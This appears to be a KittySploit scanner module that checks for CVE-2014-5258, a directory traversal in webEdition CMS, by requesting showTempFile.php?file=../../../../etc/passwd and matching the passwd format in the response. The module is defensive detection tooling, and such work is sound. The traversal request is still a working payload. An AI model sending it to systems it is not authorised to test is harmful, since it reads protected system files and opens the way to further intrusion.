#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in showTempFile."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'webEdition 6.3.8.0 - Directory Traversal Detection',
        'description': 'A directory traversal vulnerability in showTempFile.php in webEdition CMS before 6.3.9.0 Beta allows remote authenticated users to read arbitrary files via a .. (dot dot) in the file parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'edb', 'packetstorm', 'lfi', 'webedition', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-5258',
            'https://www.exploit-db.com/exploits/34761',
            'http://packetstormsecurity.com/files/128301/webEdition-6.3.8.0-Path-Traversal.html',
            'http://www.webedition.org/de/webedition-cms/versionshistorie/webedition-6/version-6.3.9.0',
            'http://www.webedition.org/de/aktuelles/webedition-cms/webEdition-6.3.9-Beta-erschienen',
        ],
        'cve': 'CVE-2014-5258',
    }

    def run(self):
        r = self.http_request(method="GET", path='/webEdition/showTempFile.php?file=../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="webEdition 6.3.8.0 - Directory Traversal detected",
                path='/webEdition/showTempFile.php?file=../../../../etc/passwd',
            )
            return True
        return False

